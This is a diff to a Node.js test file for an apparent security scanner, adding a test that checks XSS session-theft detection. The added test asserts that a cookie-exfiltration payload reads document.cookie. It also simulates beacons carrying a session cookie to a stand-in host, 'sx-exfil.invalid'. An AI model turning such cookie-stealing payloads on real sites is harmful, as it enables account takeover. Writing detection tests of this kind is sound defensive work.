@@ -6,7 +6,14 @@ import { after, test } from 'node:test';
 import { runAccessControl } from './access-control.mjs';
 import { runAttackSurface } from './attack-surface.mjs';
 import { runCloudExposure } from './cloud-exposure.mjs';
-import { cmdContext, sqliExtract, ssrfMetadata } from './impact.mjs';
+import {
+  cmdContext,
+  confirmSessionTheft,
+  cookieExfilPayload,
+  runXssImpact,
+  sqliExtract,
+  ssrfMetadata,
+} from './impact.mjs';
 import { fetchT, injReq, setScanOrigin } from './purple-engine.mjs';
 
 const servers = [];
@@ -166,6 +173,41 @@ test('impact: SSRF → cloud metadata proven on a fetching sink; non-fetching en
     null,
     'non-fetching endpoint silent',
   );
+});
+
+test("impact: XSS session theft proven only when the victim's own token returns; HttpOnly & guesses rejected", async () => {
+  const secret = 's3ss_9f3ac71b28d4e6a5'; // high-entropy session token (>= 8 chars)
+  const beacon = (cookie) => [`http://sx-exfil.invalid/b?c=${encodeURIComponent(cookie)}`];
+
+  // the exfil payload actually reads document.cookie and beacons it out
+  assert.ok(/document\.cookie/.test(cookieExfilPayload('http://sx-exfil.invalid/b')));
+
+  // positive: the injected script beaconed the victim's session cookie (contains the secret)
+  const yes = await runXssImpact({
+    targets: ['https://app.example/profile'],
+    victimSecret: secret,
+    exfil: () => beacon(`sid=${secret}; theme=dark`),
+  });
+  assert.equal(yes.length, 1);
+  assert.ok(/ACCOUNT TAKEOVER PROVEN/.test(yes[0].detail));
+  assert.ok(!yes[0].detail.includes(secret), 'the full token is masked in the report, not leaked');
+
+  // HttpOnly: document.cookie cannot read the session → beacon carries only a non-session cookie → no proof
+  const httpOnly = await runXssImpact({
+    targets: ['https://app.example/profile'],
+    victimSecret: secret,
+    exfil: () => beacon('theme=dark'),
+  });
+  assert.equal(httpOnly.length, 0, 'HttpOnly session → no false positive');
+
+  // no beacon at all (encoding-safe / CSP-blocked) → nothing
+  assert.equal(
+    (await runXssImpact({ targets: ['https://app.example/x'], victimSecret: secret, exfil: () => [] })).length,
+    0,
+  );
+
+  // short / low-entropy "secret" is never matched (would risk coincidental FPs)
+  assert.equal(confirmSessionTheft({ observations: ['...abc...'], secret: 'abc' }), null);
 });
 
 test('cloud-exposure: referenced public bucket flagged; private ignored', async () => {
